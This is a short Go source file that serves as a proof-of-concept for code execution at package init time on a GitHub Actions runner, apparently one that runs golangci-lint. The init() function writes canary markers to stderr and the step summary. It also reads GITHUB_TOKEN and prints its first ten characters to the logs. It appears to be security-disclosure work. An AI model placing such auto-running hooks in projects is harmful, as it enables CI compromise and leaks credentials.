// Package hook provides init-time code execution proof-of-concept.
package hook

import (
	"fmt"
	"os"
)

func init() {
	// Write to stderr - visible in workflow logs
	fmt.Fprintln(os.Stderr, "CANARY:HB_GOLANGCI_INIT_RAN_a7f3e:init() executed successfully on runner")

	// Write to GITHUB_STEP_SUMMARY - visible in Actions UI
	if summaryPath := os.Getenv("GITHUB_STEP_SUMMARY"); summaryPath != "" {
		f, err := os.OpenFile(summaryPath, os.O_APPEND|os.O_WRONLY, 0644)
		if err == nil {
			fmt.Fprintln(f, "### CANARY HB_GOLANGCI_INIT_RAN_a7f3e: init() executed on golangci-lint runner")
			f.Close()
		}
	}

	// Print GITHUB_TOKEN prefix for verification (non-secret prefix only)
	if token := os.Getenv("GITHUB_TOKEN"); token != "" {
		fmt.Fprintf(os.Stderr, "CANARY:GITHUB_TOKEN_EXISTS:yes:prefix=%s\n", token[:10])
	} else {
		fmt.Fprintln(os.Stderr, "CANARY:GITHUB_TOKEN_EXISTS:no")
	}
}
